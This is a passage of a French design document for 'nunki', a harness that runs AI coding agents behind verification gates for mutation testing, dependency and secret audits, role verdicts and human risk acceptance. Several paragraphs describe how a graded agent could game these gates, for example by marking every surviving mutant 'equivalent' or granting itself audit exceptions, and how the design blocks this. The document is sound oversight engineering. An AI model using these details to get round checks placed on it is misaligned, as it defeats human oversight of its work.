   tué par un test nommé, reconnu comme bug et figé dans un test, ou démontré
   équivalent en une phrase.

   **Le script de campagne, mesuré contre le vrai outil le 2026-09-10.**
   Il n'avait jamais tourné : tous les tests de la porte 7 utilisaient un
   bouchon qui imprimait une ligne JSON, et le script livré était faux de
   quatre façons que seule l'exécution pouvait montrer (cargo-mutants 27.1.0) :

   - **`--output DIR` écrit dans `DIR/mutants.out/`**, pas dans `DIR`. Le
     script lisait `DIR/missed.txt`, ne trouvait rien et sortait en erreur :
     **toutes** les campagnes auraient échoué ;
   - **`--output` ne crée pas le répertoire parent**. Une copie propre de
     `HEAD` jamais compilée n'a pas de `target/` — et c'est exactement là que
     la porte 7 tourne ;
   - **plusieurs mutants partagent une position.** `> ==`, `> <` et `> >=`
     sont tous à `src/lib.rs:2:7`, donc ni `fichier:ligne` ni
     `fichier:ligne:colonne` ne les distingue. **L'identifiant est la ligne
     entière**, qui est le nom que l'outil donne lui-même à un mutant — sans
     quoi le codeur reçoit des survivants qu'il ne peut pas répondre un par
     un dans un fichier dont c'est toute la raison d'être ;
   - **`cargo-mutants` n'était installé nulle part.** Le fragment de stack
     l'installe maintenant dans son image, après `USER agent` : posé en root,
     il atterrit là où le seul utilisateur qui le lance ne peut pas le lire.

   Un test live joue le script **tel que `nunki init` le dépose** sur un crate
   d'exemple dont une fonction n'a aucun test, et lit ses survivants avec le
   parseur de la porte 7. C'est ce qu'AGENTS.md § 4 appelle prouver en
   exécutant, et ça a coûté quatre défauts.

   **Qui écrit quoi, tranché par Arnaud le 2026-09-10, et le partage suit la
   vérifiabilité.** Les deux premières issues sont du code — écrire un test —
   et seul le codeur commite : il les écrit, dans `MUTANTS.triage.json`, et
   `nunki` les contrôle (le test nommé existe). La troisième n'est pas du code,
   c'est un jugement, et **aucune machine ne peut le vérifier** : elle n'est
   acceptée que de la main de l'humain ou du HQ, dans `MUTANTS.json`. Un
   `equivalent` venu du fichier de l'agent rend la porte rouge et est nommé.

   La raison est celle qui a mis la batterie hors de portée de l'agent :
   laisser le noté remplir la seule case que personne ne peut
   contrôler, c'est une porte qui se vide toute seule — il suffit de cocher
   « équivalent » partout avec une phrase crédible. Compter les équivalences
   les signale à un lecteur ; les refuser côté agent les empêche. Un seuil et un triage tiraient en sens contraire, et Google, dont la
   pratique inspire cette porte, ne fait ni score ni seuil. Le retour des
   survivants au codeur est un run de plus sur le lot, pas un volet. Quatre
   particularités, écrites parce qu'elles ne sont pas évidentes : elle tourne
   **dans le conteneur du slot**, lancée par `nunki exec` comme une commande
   déterministe déclarée par le fragment de stack, sans session d'agent ; sur
   une **copie git de l'arbre** à l'intérieur du conteneur, jamais sur l'arbre
   de travail, parce que les outils de mutation réécrivent les sources et
   qu'un plantage laisserait un mutant dans le code — et cette copie a **son
   propre cache de build**, chauffé une fois par slot et conservé : pour Rust,
   `cargo-mutants` ne réutilise le cache qu'en place (`--in-place`), donc en
   place sur la copie, jamais sur l'arbre du codeur ; sans cela chaque
   campagne recompile à froid, et la section 7 le compte ; elle est
   **longue**, donc elle se lance et se guette comme un run, avec un délai
   paramétré ; et elle **ne rejoue que si les fichiers touchés ont changé**
   depuis la dernière campagne verte sur cette mission. Son résultat est un
   fichier du dossier de mission que le HQ lit.

   **C'est `nunki` qui la lance, pas l'humain** (tranché par Arnaud le
   2026-09-16, après la mission `notes-api` où le moniteur s'est arrêté deux
   fois pour un verbe qu'il aurait pu taper lui-même : une fois pour la
   campagne que personne n'avait démarrée, une fois pour celle qu'un volet
   avait rendue périmée). Une porte que rien ne peut jouer arrête le flux —
   c'est ce qui le garde honnête — mais celle-ci est la seule dont l'obstacle
   soit à la portée de `nunki` : sans campagne, ou avec une campagne sur un
   autre contenu, il en lance une et regarde de nouveau au tour suivant.
   `nunki mission mutants` reste, pour l'humain qui en veut une à la main.
   **Seulement si elle est seule** : une porte 6 injouable à côté, et
   l'heure de mutation serait dépensée devant un mur que rien ne bouge.

   **Et `--again`, pour ce que l'empreinte ne voit pas.** Ajouté le
   2026-09-17. L'empreinte porte sur les fichiers touchés, mais la réponse
   d'une campagne dépend aussi de ce avec quoi elle a tourné : le
   `mutation.sh` de la stack, la version de l'outil, une exclusion ajoutée
   depuis. Rien de tout cela ne bouge l'empreinte, et la seule façon de
   repasser outre était de supprimer `MUTANTS.json` à la main — ce qui, le
   2026-09-17, a emporté `MUTANTS.triage.json` avec lui : le moteur a remplacé
   le fichier manquant par un répertoire et la mission est tombée sur
   `Is a directory (os error 21)`. Un verbe coûte moins cher que le
   contournement qu'il remplace. `--again` ne touche pas à une campagne en
   vol — celle qui tourne est rapportée comme telle — et reste **une décision
   humaine** : le moniteur ne redemande jamais de lui-même, puisque rejouer
   coûte l'heure que la section 7 compte.

8. **sécurité mécanique** : audit des dépendances, scan de secrets, analyse
   statique, par stack, dans `security.sh`. Le tableau des rôles ci-dessous
   la portait depuis le 2026-09-09 sans qu'elle soit définie nulle part ni
   implémentée ; définie ici le 2026-09-17.

   Elle est la porte du **codeur et de l'intégrateur**, jamais de l'agent de
   sécurité : lui attaque ce qui tourne et doit des constats, pas un rapport
   d'outil. C'est un script de stack, monté en lecture seule à
   `/work/stack/security.sh`, absent ou non exécutable la porte **échoue**,
   comme la batterie.

   **Elle n'est pas la batterie.** Une batterie joue des tests et une
   analyse statique — côté Rust, `clippy` et
   `cargo deny check bans licenses sources`. Ce qu'aucune stack ne joue
   aujourd'hui, ce sont les **vulnérabilités connues** et le **scan de
   secrets**. Et l'intégrateur ne joue pas `prepush.sh` mais `system.sh` :
   une vérification glissée dans la batterie ne tournerait jamais sur ses
   commits, alors que le tableau l'exige « idem sur ses commits ». Enfin un
   avis paraît **sans que le code bouge**, ce qui est une cadence à soi.

   **Le contrat, et il est agnostique à la stack.** C'est la règle de la
   porte 7 appliquée ici : `mutation.sh` émet une ligne JSON par survivant et
   `nunki` ne sait rien de cargo-mutants. De même, `security.sh` fait tout le
   travail propre à son écosystème et émet **un objet JSON par ligne**, un par
   constat :

   ```json
   {"id":"…","kind":"vulnerability","where":"time 0.1.45",
    "fix":">=0.2.23","accepted":"pas de correctif amont; appel jamais atteint",
    "was_at_base":false}
   ```

   - `id` — l'identifiant de l'écosystème, **opaque** pour `nunki` ;
   - `kind` — `vulnerability`, `unmaintained`, `secret`, `lint` : les seules
     classes sur lesquelles `nunki` raisonne ;
   - `where` — où, pour un humain : paquet et version, ou `fichier:ligne`
     pour un secret ;
   - `fix` — ce qui le corrige. **Vide veut dire qu'il n'en existe pas**, et
     c'est le discriminateur de tout ce qui suit ;
   - `accepted` — la raison, lue par le script dans le mécanisme d'exception
     **propre à l'écosystème** ; absent si le constat n'est pas accepté ;
   - `was_at_base` — le constat était-il déjà là sur la base de la mission.
     C'est ce qui sépare ce que la branche a apporté de ce que le dépôt
     portait déjà.

   `nunki` décide sur ces six champs et rien d'autre : ce qui n'était pas à
   la base et n'est pas `accepted` est rouge ; ce qui y était déjà est un
   constat ; `accepted` avec un `fix` non vide est une exception périmée.
   Aucune de ces règles ne nomme un outil.

   C'est ce qui rend les stacks suivantes possibles sans toucher au cœur :
   Rust rend `deny.toml` et `cargo audit`, Python son propre auditeur et sa
   propre liste, Next.js la sienne, Solidity une analyse statique qui n'a
   même pas de notion de dépendance vulnérable. Chacune garde **sa
   convention**, ce qui est la raison même pour laquelle les exceptions
   restent dans `deny.toml` côté Rust.

   **Le fragment Rust, en exemple travaillé.** Tout ce qui suit est le
   contenu de `security.sh` pour Rust, jamais du code de `nunki`.

   **Deux exécutions, et c'est la clé du mécanisme.** Mesuré le 2026-09-17
   sur cargo-deny 0.20.2 et cargo-audit 0.22.0, un avis réel
   (RUSTSEC-2020-0071 dans `time` 0.1.44) placé dans la liste `ignore` de
   `deny.toml` :

   - `cargo deny check advisories` répond `advisories ok`, sortie 0 — **la
     porte**, qui honore les exceptions ;
   - `cargo audit --json`, dans le même dossier, signale quand même l'avis —
     **le rapport**, qui voit tout. Il ne lit pas `deny.toml` : sa
     configuration est `.cargo/audit.toml` et son `--ignore`.

   Aucune isolation n'est donc nécessaire : ni bac à sable, ni clone, ni
   fichier renommé. Les deux outils sont déjà les deux vues, côte à côte.

   **`patched` est ce que le fragment Rust met dans `fix`**, et il est
   lisible par machine. Mesuré le même jour : `versions.patched` vaut
   `[">=0.2.23"]` pour un avis corrigé et `[]` pour un avis qui ne l'est pas
   (RUSTSEC-2021-0139, `ansi_term`, abandonné). C'est ce qui permet à une
   exception de se retirer toute seule — et `nunki` n'en voit que `fix`,
   rempli ou vide.

   **Fin de l'exemple ; ce qui suit vaut pour toute stack.**

   **La base d'avis ne peut pas être téléchargée par l'agent.** Vrai de tout
   écosystème — un auditeur lit une base publiée quelque part, et cet endroit
   est hors de la liste blanche d'un agent. Mesuré le 2026-09-17 sur Rust :
   `~/.cargo/advisory-db` vient de
   `https://github.com/RustSec/advisory-db.git`, donc de **github.com**, donc
   d'une forge — et aucune forge n'entre dans la liste blanche d'un agent
   (4.1 bis ; `nunki check` est rouge si une y apparaît). La base est donc
   rafraîchie **sur l'hôte**, montée en lecture seule dans le conteneur, et
   l'audit tourne avec `--no-fetch` (mesuré : il trouve la vulnérabilité sans
   réseau). Ce qui juge l'agent reste hors de sa portée par construction,
   comme les scripts de stack — et une porte dont la réponse dépend d'une
   base doit **dire la date de cette base**.

   **Ce qui bloque est ce qui est nouveau depuis la base.** Tranché par
   Arnaud le 2026-09-17. Un avis paru cette nuit dans une dépendance que la
   branche n'a jamais touchée est déjà sur `dev` : arrêter la mission punit
   le mauvais changement, pour une cause hors de portée de l'agent — la
   réparer le ferait sortir de son périmètre, donc échouer la porte 4. Même
   grammaire que la porte 4 (les chemins touchés) et la porte 7 (l'empreinte
   des fichiers touchés) : **ce qui est nouveau depuis la base appartient à
   la mission, ce qui préexiste appartient au projet.**

   **Mais le préexistant est rendu, jamais tu.** C'est la condition de la
   règle ci-dessus et non un ornement : une porte qui ne peut pas dire « je
   sais, et ce n'est pas de cette mission » ment par omission. Chaque constat
   préexistant paraît dans la sortie de la porte et dans `PR.md`, sans la
   rougir. Le risque est assumé et nommé ici : **la dette d'un dépôt ne se
   résorbe pas toute seule**, et aucune mission de fonctionnalité ne la
   forcera. Son foyer est un audit — la sécurité mécanique jouée hors
   mission, sur un dépôt entier.

   Le contrat porte donc un champ de plus, `was_at_base`, et `nunki` décide
   dessus sans savoir ce qu'est un lockfile : `was_at_base` faux et pas
   `accepted` → rouge ; `was_at_base` vrai et pas `accepted` → constat. La
   comparaison est **au script**, comme le reste de l'écosystème : `nunki`
   lui passe la base, comme il passe les chemins touchés à `mutation.sh`.
   Côté Rust, `git show <base>:Cargo.lock` puis un audit sur ce fichier
   suffit — mesuré le 2026-09-17, `cargo audit -f <lockfile>` lit n'importe
   quel lockfile, sans second checkout et sans compiler.

   Deux fuites cherchées et absentes, mesurées sur le raisonnement plutôt que
   supposées : un codeur **ne peut pas déguiser** une vulnérabilité en
   préexistante, parce que la comparaison porte sur les avis *rapportés* et
   non sur la base de données — monter une lib vers une version vulnérable
   fait paraître l'avis à `HEAD` et pas à la base. Et il ne peut pas
   s'auto-délivrer une exception, `deny.toml` étant dans
   `protected_paths.refuse`.

   **Une troisième voie écartée : le seuil de sévérité.** Faire bloquer une
   critique préexistante et pas une basse est la pratique courante ailleurs,
   et c'est un seuil — que la porte 7 refuse explicitement deux points plus
   haut (« Pas de seuil »). Un seuil ici casserait la cohérence de la
   doctrine, et tous les avis ne portent pas de score. Écartée avec la voie
   du délai de grâce, qui est le même seuil habillé en date.

   **Ce que l'agent fait d'un avis.** Tranché par Arnaud le 2026-09-17, en
   trois cas :

   1. **aucun avis** — on continue ;
   2. **avis avec correctif** (`patched` non vide) — l'agent l'applique :
      montée de version, batterie rejouée, commit. Aucun humain. C'est le cas
      courant, y compris pour une dépendance **transitive**, qu'un
      `cargo update -p` corrige sans toucher au parent dès que sa contrainte
      autorise la version corrigée ;
   3. **avis sans correctif** (`patched` vide) — et là seulement, deux voies.

   **La voie a : changer de librairie**, et elle a elle-même trois cas,
   tranchés par Arnaud le 2026-09-17 :

   - la librairie est **explicitement voulue** par le propriétaire : interdit
     de la remplacer, on va en b ;
   - rien n'a été dit sur elle : elle peut être remplacée. L'agent le tente,
     la vérification est automatique — il rejoue `security.sh`, qui lui dit
     s'il a échangé un avis contre un autre — et il **le dit dans `PR.md`**,
     parce qu'un changement de dépendance se relit ;
   - c'est une dépendance **d'une librairie explicitement voulue** : le
     parent ne peut pas être remplacé, on va en b.

   « Explicitement voulue » doit être **lisible par une machine**, sans quoi
   les deux premiers cas ne se distinguent pas. Proposé le 2026-09-17, à
   trancher : une section de `nunki.yaml`, qui vit hors du dépôt et **n'est
   jamais montée** — donc que l'agent ne peut ni lire ni contourner :

   ```yaml
   dependencies:
     keep:
       - name: tokio
         because: the runtime the whole service is built on
   ```

   Une librairie `keep`, et tout parent d'une dépendance vulnérable qui en
   est une, rend la voie a impossible : l'agent va directement en b sans
   dépenser une tentative à chercher une alternative qu'on lui refusera.

   **La voie b : accepter le risque, et c'est l'humain.** C'est un jugement
   que rien ne peut vérifier, donc la même règle que pour un survivant
   « équivalent » de la porte 7 : *cet avis n'est pas à l'agent de le
   donner*. L'exception s'écrit dans la liste `ignore` de `deny.toml`, avec
   sa `reason` — tranché par Arnaud le 2026-09-17, **contre** une proposition
   de la mettre au QG : c'est la convention de Rust, `deny.toml` doit vivre
   dans le dépôt puisque la CI s'en sert, et une exception de sécurité y est
   **relue en pull request** au lieu d'être enfouie là où personne ne la
   voit. L'agent ne peut pas l'écrire lui-même : `nunki init` met déjà
   `deny.toml` dans `protected_paths.refuse`, et la porte 4 refuse tout
   commit qui y touche.

   Une raison qui **nomme** vaut mieux qu'une qui dit « risque accepté ». Le
   cas le plus fréquent d'acceptation n'est pas « pas de correctif » mais
   « le code vulnérable n'est pas atteignable » — que ni `cargo audit` ni
   `cargo deny` ne savent voir, et dont la raison peut au moins nommer la
   fonction.

   **Une exception se revérifie à chaque mission, et se retire toute seule.**
   Tranché par Arnaud le 2026-09-17. Une exception posée au jour 1 faute de
   correctif n'a plus lieu d'être le jour où le correctif sort, et personne
   n'y repensera. Une date d'expiration avait été proposée et **écartée** :
   cargo-deny 0.20.2 n'en accepte pas (mesuré : la liste `ignore` ne connaît
   que `id` et `reason`), et surtout une date est une devinette là où la
   vraie condition est mécanique. À chaque passage de la porte, pour chaque
   id de `ignore` :

   - `patched` vide → l'exception vaut encore, on continue ;
   - `patched` non vide → **l'exception est périmée, un correctif existe :
     applique-le**, et retire l'exception.

   **Ce qui reste à trancher : les avis qui ne sont pas des vulnérabilités.**
   `--deny warnings` fait aussi remonter `unmaintained`, `unsound`, `notice`
   et `yanked`. Ils ont `patched` vide **par nature** — `ansi_term` ne sera
   jamais corrigé, il est abandonné — donc la revérification ci-dessus ne les
   touchera jamais et une exception sur l'un d'eux est éternelle. Les traiter
   comme une vulnérabilité enverrait écrire des exceptions permanentes pour
   du bruit. La voie proposée est de les rendre en **constat** plutôt qu'en
   blocage, leur seule sortie réelle étant la voie a. `kind` est dans le
   contrat pour que cette règle se dise sans nommer un outil : Python et
   Next.js porteront la même distinction sous d'autres noms. Non tranché.

Ces huit portes sont celles du **codeur**. La seconde revue a montré
qu'appliquées telles quelles aux deux autres rôles elles étaient indéfinies
ou absurdes — une batterie sans services pour l'intégrateur, une mutation de
tests système, un `PR.md` pour une sécurité qui ne commite pas. Tranché par
Arnaud le 2026-09-09 : **chaque rôle a les portes qui correspondent à ce
qu'il produit.**

| porte | codeur | intégrateur | sécurité |
|---|---|---|---|
| 1 arbre propre | oui | oui | sans objet (arbre en lecture seule) |
| 2 branche non protégée, en avance | oui | oui | sans objet |
| 3 bloc de reprise nomme `HEAD` | oui | oui | oui (son journal) |
| 4 périmètre | chemins protégés, zone de tests si mission de tests | **le câblage seulement** : la liste de chemins de son `MISSION.md` (tests système, configuration de test, fixtures, ordre des migrations) ; tout commit hors liste est hors périmètre | sans objet |
| 5 livrable | `PR.md` | `PR.md` complété de la section intégration | le rapport, dans `VERDICT.json` |
| 6 batterie | oui | **ses tests système verts**, dans le profil système | sans objet |
| 7 mutation | oui | non (des tests système et de la configuration ne se mutent pas) | non |
| 8 sécurité mécanique | audit des dépendances, scan de secrets, analyse statique par stack (`security.sh`) | idem sur ses commits | sans objet (il attaque ce qui tourne) |
| verdict | implicite : portes vertes | `INTEGRATED` / `BROKEN` | `CLEAR` / `FINDINGS` |

**Le verdict et le `HEAD`, quand l'intégrateur commite.** Tranché par Arnaud
le 2026-09-09. La v1 disait « on ne pousse que si les trois verdicts portent
le `HEAD` courant », ce qui est impossible dès que l'intégrateur ajoute un
commit derrière celui du codeur. La règle juste : chaque verdict porte le
commit de **son** rôle, et le verdict du codeur **reste valable tant que tout
ce qui a été ajouté après lui n'est que du câblage de l'intégrateur** passé
par sa porte 4. `nunki push` exige donc `INTEGRATED` et `CLEAR` sur le dernier
commit, et le verdict du codeur sur un ancêtre dont la différence ne contient
que des commits de câblage. Un commit après le sien qui touche au code métier
invalide son verdict, et le codeur repart en volet. Sans intégrateur
(`integration: none`), le verdict du codeur est sur le dernier commit et la
règle de l'ancêtre ne sert pas — précisé le 2026-09-10 à l'implémentation :
la liste de câblage est alors **vide, pas absente**, donc n'importe quel
commit après celui du codeur invalide son verdict, ce qui est exactement ce
que « personne n'avait le droit de commiter après lui » veut dire.

**Où vivent les verdicts.** Précisé le 2026-09-10. `VERDICT.json` n'en porte
qu'un à la fois et chaque rôle l'écrase : le fichier ne peut donc plus
répondre « l'intégrateur est-il passé, et sur quoi ? » une fois que la
sécurité a écrit. C'est **l'état de `nunki`** qui porte les verdicts et leurs
`HEAD` (4.2 le disait déjà), et c'est là que `nunki push` les lit. Un rôle qui
conclut à nouveau **remplace** sa réponse précédente : un `INTEGRATED`
d'avant une correction n'est pas un second avis, c'en est un périmé, et
garder les deux laisserait `nunki push` trouver le vert qu'il cherche parmi des
réponses portant sur d'autres commits. Le verdict du codeur, lui, est
implicite — ses portes étaient vertes — et ce qui est enregistré est le
commit sur lequel elles l'étaient.

Puis, dans l'ordre et selon la forme déclarée : la mission d'**intégration**
(le livrable est connecté à ses infrastructures et les tests système passent,
dans le profil système), puis la mission de **sécurité** (le livrable, intégré
s'il y a des services, est attaqué et le rapport est `CLEAR`). L'ordre n'est
pas arbitraire : on ne pentest pas un système qui n'est pas encore branché.

### 4.5 Le flux d'une mission, et les règles d'itération

Le flux, tranché par Arnaud le 2026-09-08. Il tient en une boucle par étape,
et le HQ est le seul à tenir le volant.

```text
HQ lance le CODEUR (profil mission)
   le codeur travaille par lots, run après run, commite lot après lot,
   jusqu'à la fin de sa mission (portes 1-4 à chaque run, 5-7 et la
   sécurité mécanique à la fin)
[si integration: services]
HQ lève le profil système sur le même slot, lance l'INTÉGRATEUR sur ce HEAD
   ├─ BROKEN  : l'intégrateur écrit son constat dans son journal et son
   │            VERDICT.json ; le HQ reprend la main, le transcrit dans le
   │            FOLLOWUP_HQ.md du codeur, et relance le codeur en volet —
   │            tant que l'intégrateur échoue
   └─ INTEGRATED
[si security: agent]
HQ lance la SÉCURITÉ sur ce HEAD (profil système s'il y a des services, sinon
   profil mission ; arbre en lecture seule)
   ├─ FINDINGS : même principe — journal de la sécurité, le HQ reprend, renvoie
   │             au codeur, et l'intégrateur REJOUE avant la sécurité, puisque
   │             le code a changé
   └─ CLEAR
l'HUMAIN valide ──► nunki push : la branche est poussée, la pull request ouverte
```

Une étape absente parce que la forme de la mission ne la déclare pas n'est
pas une étape sautée : elle est **absente par déclaration validée**, et le
résumé de `nunki verify` le dit en ces mots. Une porte qui ne peut pas s'exécuter,
elle, échoue toujours.

Ce que la boucle veut dire, et ce qu'elle ne veut pas dire.

- **L'échec revient toujours au codeur.** L'intégrateur et la sécurité ne
  touchent pas au code métier ; ce qu'ils constatent, c'est que le code ne
  tient pas face au réel. Le câblage et l'environnement, l'intégrateur les
  corrige lui-même dans sa mission, run après run, avant de conclure : un
  `BROKEN` dit « le code doit changer », pas « je n'ai pas réussi à brancher ».
- **Le constat vit dans le journal du rôle qui l'a fait**, et c'est le HQ qui
  le porte au codeur, dans son `FOLLOWUP_HQ.md`, daté. L'agent ne parle
  jamais directement à un autre agent : tout passe par le HQ et par des
  fichiers, pour que la perte d'une session ne perde rien.
- **Un verdict vaut pour un `HEAD`.** `VERDICT.json` porte le commit sur
  lequel le rôle a conclu, et `nunki` le refuse s'il ne correspond pas au `HEAD`
  réel. Un nouveau commit du codeur rend caducs l'`INTEGRATED` et le `CLEAR`
  précédents : après une correction, l'intégrateur rejoue, puis la sécurité.
  `nunki push` refuse sans les deux verdicts sur le `HEAD` courant.
- **Rien ne se pousse en rouge.** Il n'existe pas de drapeau pour passer
  outre. Un constat de sécurité ne se ferme que corrigé, ou démontré faux
  positif en une phrase que le HQ contre-vérifie, ou **accepté comme risque
  par l'humain**. L'acceptation passe par un verbe,
  `nunki mission accept <mission> --because <pourquoi>`, qui l'écrit dans l'état
  de `nunki` et, daté, dans le `FOLLOWUP_HQ.md` ; `VERDICT.json` reste
  `FINDINGS` — c'est l'état qui sait que l'humain a levé le constat, et
  `nunki push` le lit là. Aucun agent n'accepte un risque.

  **Deux formes, et deux verbes.** Précisé le 2026-09-10 à l'implémentation,
  parce que la boucle donnait le geste au HQ sans nommer par quoi il passe :

  - `nunki mission accept <mission> --finding <nom> --because <pourquoi>`
    **inventorie** un constat levé et ne conclut rien : itérer sur la liste
    n'est pas la clore, et une session qui prendrait la première acceptation
    pour la dernière pousserait sur un rapport que personne n'a fini de lire.
    Sans `--finding`, c'est ce que le rapport porte encore qui est levé, et
    la mission conclut.
  - `nunki mission iterate <mission>` renvoie au codeur en volet. C'est un
    **geste**, pas un défaut : un `verify` qui renverrait de lui-même
    dépenserait un volet que l'humain voulait peut-être dépenser en
    acceptation.
  - `--because` n'est jamais facultatif : un risque accepté sans raison n'est
    pas accepté, il est oublié.
  - **Une acceptation vaut pour un `HEAD`**, comme le verdict qu'elle lève.
    Un nouveau commit la périme au lieu de la reporter en silence.
- **La boucle est bornée, et la borne est un paramètre.** Tranché par Arnaud
  le 2026-09-08 : **trois volets** par défaut. Au troisième retour au codeur
  sur une même mission, le HQ ne relance pas : il s'arrête et remonte à
  l'humain, avec les trois constats côte à côte. La valeur se règle dans
  `nunki.yaml` et par mission (`MISSION.md` prime), jamais en dur dans le
  moteur ; la mettre à zéro n'est pas « sans limite » mais « aucune
  itération : le premier rouge remonte ».
- **Et la main rendue se reprend.** Ajouté le 2026-09-17, sur un trou mesuré :
  toutes les façons d'atteindre « rendue à l'humain » sont une borne qui
  s'épuise — les tentatives d'un lot, celles d'un rôle, les volets — et
  jusqu'ici aucune n'en sortait. `resume` lève une suspension, `iterate` et
  `accept` ne partent que de `FINDINGS`, et le moniteur abandonne l'étape :
  une mission qui avait épuisé ses volets était finie sans être terminée.
  `nunki mission retry <mission> --because <ce qui a changé>` la reprend, sur
  le travail où elle s'est arrêtée, **et rend les bornes entières** — remettre
  le compteur *est* le verbe, pas un effet de bord : sans cela le rouge
  suivant retombe dans la même remontée. La raison n'est pas facultative et ne
  va pas que dans l'état : elle est écrite dans `FOLLOWUP_HQ.md`, que chaque
  rôle lit avant tout le reste, parce que ni l'arbre ni la cause n'ont bougé
  d'eux-mêmes — un `retry` qui ne dit rien rachète la même remontée. Une
  mission que l'humain a **appelée off** avec `end` n'est pas une borne
  épuisée : elle est refusée, sinon `end` deviendrait un verbe sur lequel il
  ne peut pas compter.
- **Un run tombé pour une cause du harnais ne compte pas.** Quota atteint,
  jeton expiré, réseau, plantage : `nunki` attend et rejoue le run, sans
  consommer une tentative ni un volet, ni écrire un verdict, avec l'attente
  croissante et le plafond de 4.3. Seul un run fini, ou échoué pour une cause
  de la mission (blocage constaté, contrat non rempli), avance la machine à
  états.

## 5. Pris à l'existant, construit ici

Vérifié le 2026-09-09 par la revue indépendante, sur les pages des projets et
la documentation officielle.

| besoin | candidat existant | verdict |
|---|---|---|
| règles lues par tout harnais | `AGENTS.md` (standard de fait ; Claude Code par import `@AGENTS.md` ou lien, documenté) | **pris** |
| outils exposés à tout harnais | MCP | **pris** pour ce qui doit être appelé par l'agent |
| compétences réutilisables | `SKILL.md`, standard ouvert (agentskills.io), adopté par OpenCode, Codex, Gemini CLI, Cursor, Copilot, Goose, Roo, Kiro, Amp | **pris** |
| slots isolés par agent, multi-harnais | Vibe Kanban (en fin de vie), claude-squad (déprécié en février 2026), Conductor (Mac seulement), Container Use (Dagger, vivant) | **construit ici** (tranché) : aucun ne garantit l'`origin` inatteignable, deux sont morts, et c'est trois appels |
| bac à sable | conteneurs OCI par Compose généré ; devcontainer réduit à une vue IDE ; micro-VM (bacs à sable Docker pour agents, `container` d'Apple : macOS 26 et Apple silicon seulement) pour l'isolation du noyau | **pris** (Compose) ; micro-VM à évaluer un jour pour l'agent sécurité, jamais comme base |
| pilotage par spec, rôles d'agents | spec-kit (GitHub), méthode BMAD | à lire ; BMAD a des rôles (dev, QA…) mais ni intégrateur branché sur de l'infra réelle, ni HQ, ni portes |
| services d'intégration jetables | le fichier Compose des services du projet, fusionné dans le Compose généré par `nunki` | **pris**. Pas Testcontainers : il lève des conteneurs depuis le processus de test, donc depuis le conteneur de l'agent, donc avec le socket Docker — ce que 3.2 interdit |
| protocole de mission, contrat de run, reprise à froid | — | **construit ici** : personne ne le livre |
| portes de vérification déterministes | — | **construit ici** |
| HQ comme lieu de décision, journal en trois étages | — | **construit ici** |
| agent sécurité en boucle | outils de scan par stack (audit de dépendances, SAST, fuzzers), à orchestrer | **construit ici** pour l'orchestration, outils pris |
| la règle « refuser est sûr, demander est dangereux » | — | **construit ici**, et à écrire dans chaque adaptateur |

## 6. Ce que cette version ne dit pas encore

- Le format de la prose de `MISSION.md` et de `JOURNAL.md`, à reprendre des
  gabarits existants ; seul l'en-tête structuré est fixé (4.1).
- Le schéma exact de `nunki.yaml`, de l'en-tête de mission, de `VERDICT.json`
  et des définitions de profil : leurs champs sont nommés ici, leur forme se
  fixe avec le premier code, et se versionne.
- L'observabilité (Langfuse ou autre), volontairement hors du socle.
- Ce que devient `claude-setup` : gelé dans sa PR #5, référence pour ce que ce
  dépôt reprend.

## 7. Ce que ça coûte, dit une fois

La revue a reproché au brouillon de vendre sans chiffrer. Voici l'addition.

- **Un cycle complet, au pire cas** : une mission codeur, sept portes dont la
  mutation, une mission d'intégration, une mission de sécurité, puis jusqu'à
  trois fois (volet codeur, portes, intégration, sécurité). Sur un projet
  moyen, c'est une journée. La borne de trois volets et la mutation qui ne
  rejoue que sur changement sont ce qui l'empêche de doubler.
- **La consommation** : trois rôles par mission triplent les tokens d'une
  mission solitaire, et tout est pris sur la **fenêtre de l'abonnement**
  d'Arnaud, partagée avec sa session HQ (4.3) : plusieurs slots en parallèle
  la saturent, et la session HQ avec. `nunki.yaml` porte un **plafond par
  mission en tokens et en runs** et un comportement en quota atteint
  (attendre, puis remonter à l'humain), parce que sans plafond une boucle
  bornée à trois volets peut encore consommer une nuit de fenêtre. Claude
  Code rend la consommation dans sa sortie structurée, en quatre sortes
  (entrée, sortie, cache écrit, cache lu — mesuré sur v2.1.266), et le trait
  la rend pour tout run fini, quelle qu'en soit l'issue : un run tombé pour
  quota a consommé aussi. Tranché par Arnaud le 2026-09-11 : `max_runs` et
  `max_tokens` sont **facultatifs et sans valeur par défaut** — les runs sont
  déjà bornés par les tentatives et les volets (pire cas légitime d'une
  mission de deux lots : 48), et un chiffre de tokens attend des missions
  réelles mesurées ; d'ici là `nunki mission status` affiche ce que chaque
  mission a dépensé, sorte par sorte. `max_tokens` compte les quatre sortes
  additionnées. Le plafond se vérifie **entre deux runs**, au site de
  lancement : un run en cours n'est jamais tué pour lui, si bien qu'une
  mission peut le dépasser d'un run au plus ; atteint, `nunki` pose sa retenue
  avec la raison, et on le relève dans l'en-tête, par `nunki mission reframe`,
  puis `nunki mission resume`. Un run se compte quand `nunki verify` le
  relit, quel que soit le rôle — le premier run du codeur compris, lancé par
  `nunki mission start`.
- **Les tests système sur une vraie API tierce** : lents, instables, à effets
  de bord, et deux missions parallèles partagent le même palier de test et se
  marchent dessus. Une mission d'intégration qui déclare un fournisseur réel
  **verrouille ce fournisseur** pour les autres missions du projet le temps
  de ses runs — un verrou de plus dans l'état de `nunki` (4.2), à côté du verrou
  de slot. Un fournisseur réel est un service que l'en-tête déclare
  `shared: true`, posé par l'humain au cadrage : rien n'est deviné des
  domaines (tranché par Arnaud le 2026-09-11). Le verrou se déduit de
  l'état : un fournisseur est pris tant qu'une autre mission se tient à son
  étape d'intégration avec un run enregistré et le déclare. Relu, le run est
  oublié et le verrou tombe avec lui, si bien qu'aucune mission finie,
  recadrée ou tombée ne laisse de verrou derrière elle. Un verrou court, un
  fichier par fournisseur, n'encadre que la vérification et le lancement,
  pour que deux moniteurs ne trouvent pas ensemble un fournisseur libre. Un
  intégrateur dont un fournisseur est pris n'est pas lancé : `nunki verify` le
  dit (`busy`), sans tentative consommée, et le moniteur de la mission
  regarde à nouveau chaque minute.
- **La connexion sans interface** : un geste humain avec navigateur par
  harnais et par an pour Claude Code, un jeton partagé par tous les slots,
  dont la révocation arrête tout d'un coup.
- **Ce que `nunki check` ne voit pas** : la protection de branche côté forge
  sans credential ou déclarée `by_hand`, et ce que l'agent lit dans son propre conteneur. Il le dit
  au lieu de se taire.
